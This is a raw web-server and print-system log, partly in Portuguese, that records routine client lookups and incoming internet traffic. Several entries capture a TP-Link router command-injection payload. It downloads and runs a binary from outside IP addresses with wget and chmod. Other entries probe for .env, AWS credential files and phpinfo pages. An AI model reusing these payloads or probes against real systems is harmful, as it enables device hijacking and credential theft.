+01:32.41 - (PrintSystem): Encontrado:
+01:32.41 - (PrintSystem):     "Rei da pizza"
+01:32.41 - (PrintSystem):     "Rps Entre Rios"
+01:32.41 - (WebService): Request de '115.231.78.12:40068' no endpoint '/'.
+01:34.03 - (WebService): Request of '115.231.78.12:43667' at '/favicon.ico' endpoint. (404)
+01:55.01 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+01:55.01 - (PrintSystem): Encontrado:
+01:55.01 - (PrintSystem):     "Rei da pizza"
+01:55.01 - (PrintSystem):     "Rps Entre Rios"
+01:55.01 - (WebService): Request de '185.224.128.43:41402' no endpoint '/'.
+01:56.23 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+01:56.23 - (PrintSystem): Encontrado:
+01:56.23 - (PrintSystem):     "Rei da pizza"
+01:56.23 - (PrintSystem):     "Rps Entre Rios"
+01:56.23 - (WebService): Request de '209.97.152.248:33619' no endpoint '/'.
+02:22.26 - (WebService): Request of '84.54.51.37:34060' at '/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F147.78.103.155%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)' endpoint. (404)
+03:29.36 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+03:29.36 - (PrintSystem): Encontrado:
+03:29.36 - (PrintSystem):     "Rei da pizza"
+03:29.36 - (PrintSystem):     "Rps Entre Rios"
+03:29.36 - (WebService): Request de '5.235.203.94:36093' no endpoint '/'.
+04:31.42 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+04:31.42 - (PrintSystem): Encontrado:
+04:31.42 - (PrintSystem):     "Rei da pizza"
+04:31.42 - (PrintSystem):     "Rps Entre Rios"
+04:31.42 - (WebService): Request de '185.180.140.6:59174' no endpoint '/'.
+04:33.38 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+04:33.38 - (PrintSystem): Encontrado:
+04:33.38 - (PrintSystem):     "Rei da pizza"
+04:33.38 - (PrintSystem):     "Rps Entre Rios"
+04:33.38 - (WebService): Request de '45.156.129.46:43744' no endpoint '/'.
+04:33.44 - (WebService): Request of '45.156.129.46:49316' at '/ext-js/app/common/zld_product_spec.js' endpoint. (404)
+04:52.25 - (WebService): Request of '195.1.144.109:38594' at '/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.15.222.150%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)' endpoint. (404)
+04:54.56 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+04:54.56 - (PrintSystem): Encontrado:
+04:54.56 - (PrintSystem):     "Rei da pizza"
+04:54.56 - (PrintSystem):     "Rps Entre Rios"
+04:54.56 - (WebService): Request de '179.43.188.106:40710' no endpoint '/'.
+06:27.57 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+06:27.57 - (PrintSystem): Encontrado:
+06:27.57 - (PrintSystem):     "Rei da pizza"
+06:27.57 - (PrintSystem):     "Rps Entre Rios"
+06:27.57 - (WebService): Request de '185.16.38.111:47414' no endpoint '/'.
+06:55.29 - (WebService): Request of '78.153.140.179:42330' at '/.env' endpoint. (404)
+06:55.32 - (WebService): Request of '78.153.140.179:56060' at '/.env' endpoint. (404)
+06:55.32 - (WebService): Request of '78.153.140.179:59556' at '/.aws/credentials' endpoint. (404)
+06:55.32 - (WebService): Request of '78.153.140.179:34612' at '/.aws/credentials' endpoint. (404)
+06:55.33 - (WebService): Request of '78.153.140.179:37776' at '/.aws/config' endpoint. (404)
+06:55.34 - (WebService): Request of '78.153.140.179:40762' at '/.aws/config' endpoint. (404)
+06:55.34 - (WebService): Request of '78.153.140.179:43944' at '/aws/credentials' endpoint. (404)
+06:55.35 - (WebService): Request of '78.153.140.179:46774' at '/aws/credentials' endpoint. (404)
+06:55.36 - (WebService): Request of '78.153.140.179:55052' at '/test.php' endpoint. (404)
+06:55.36 - (WebService): Request of '78.153.140.179:58206' at '/test.php' endpoint. (404)
+06:55.37 - (WebService): Request of '78.153.140.179:32842' at '/phpinfo' endpoint. (404)
+06:55.37 - (WebService): Request of '78.153.140.179:35708' at '/phpinfo' endpoint. (404)
+06:55.38 - (WebService): Request of '78.153.140.179:40358' at '/_profiler/phpinfo' endpoint. (404)
+06:55.39 - (WebService): Request of '78.153.140.179:44244' at '/_profiler/phpinfo' endpoint. (404)
+06:55.39 - (WebService): Request of '78.153.140.179:49566' at '/phpinfo.php' endpoint. (404)
+06:55.40 - (WebService): Request of '78.153.140.179:52658' at '/phpinfo.php' endpoint. (404)
+06:55.40 - (WebService): Request of '78.153.140.179:56340' at '/info.php' endpoint. (404)
+06:55.41 - (WebService): Request of '78.153.140.179:59784' at '/info.php' endpoint. (404)
+06:55.59 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+06:55.59 - (PrintSystem): Encontrado:
+06:55.59 - (PrintSystem):     "Rei da pizza"
+06:55.59 - (PrintSystem):     "Rps Entre Rios"
+06:55.59 - (WebService): Request de '66.240.236.116:42136' no endpoint '/'.
+07:25.05 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+07:25.05 - (PrintSystem): Encontrado:
+07:25.05 - (PrintSystem):     "Rei da pizza"
+07:25.05 - (PrintSystem):     "Rps Entre Rios"
+07:25.05 - (WebService): Request de '185.224.128.43:41014' no endpoint '/'.
+07:32.51 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+07:32.51 - (PrintSystem): Encontrado:
+07:32.51 - (PrintSystem):     "Rei da pizza"
+07:32.51 - (PrintSystem):     "Rps Entre Rios"
+07:32.51 - (WebService): Request de '205.210.31.231:51145' no endpoint '/'.
+07:34.12 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+07:34.12 - (PrintSystem): Encontrado:
+07:34.12 - (PrintSystem):     "Rei da pizza"
+07:34.12 - (PrintSystem):     "Rps Entre Rios"
+07:34.12 - (WebService): Request de '179.43.188.106:38026' no endpoint '/'.
+08:22.16 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+08:22.16 - (PrintSystem): Encontrado:
+08:22.16 - (PrintSystem):     "Rei da pizza"
+08:22.16 - (PrintSystem):     "Rps Entre Rios"
+08:22.16 - (WebService): Request de '159.223.225.251:26767' no endpoint '/'.
+08:26.58 - (WebService): Request of '84.54.51.37:59284' at '/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F147.78.103.155%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)' endpoint. (404)
+08:28.07 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+08:28.07 - (PrintSystem): Encontrado:
+08:28.07 - (PrintSystem):     "Rei da pizza"
+08:28.07 - (PrintSystem):     "Rps Entre Rios"
+08:28.07 - (WebService): Request de '179.43.188.106:47006' no endpoint '/'.
+08:41.46 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+08:41.46 - (PrintSystem): Encontrado:
+08:41.46 - (PrintSystem):     "Rei da pizza"
+08:41.46 - (PrintSystem):     "Rps Entre Rios"
+08:41.46 - (WebService): Request de '179.43.188.106:39530' no endpoint '/'.
+08:57.48 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+08:57.48 - (PrintSystem): Encontrado:
+08:57.48 - (PrintSystem):     "Rei da pizza"
+08:57.48 - (PrintSystem):     "Rps Entre Rios"
+08:57.48 - (WebService): Request de '44.220.185.209:33578' no endpoint '/'.
+10:13.43 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+10:13.43 - (PrintSystem): Encontrado:
+10:13.43 - (PrintSystem):     "Rei da pizza"
+10:13.43 - (PrintSystem):     "Rps Entre Rios"
+10:13.43 - (WebService): Request de '179.43.188.106:58262' no endpoint '/'.
+11:07.33 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+11:07.33 - (PrintSystem): Encontrado:
+11:07.33 - (PrintSystem):     "Rei da pizza"
+11:07.33 - (PrintSystem):     "Rps Entre Rios"
+11:07.33 - (WebService): Request de '87.246.7.62:61001' no endpoint '/'.
+11:26.55 - (WebService): Request of '84.54.51.37:47330' at '/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F147.78.103.155%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)' endpoint. (404)
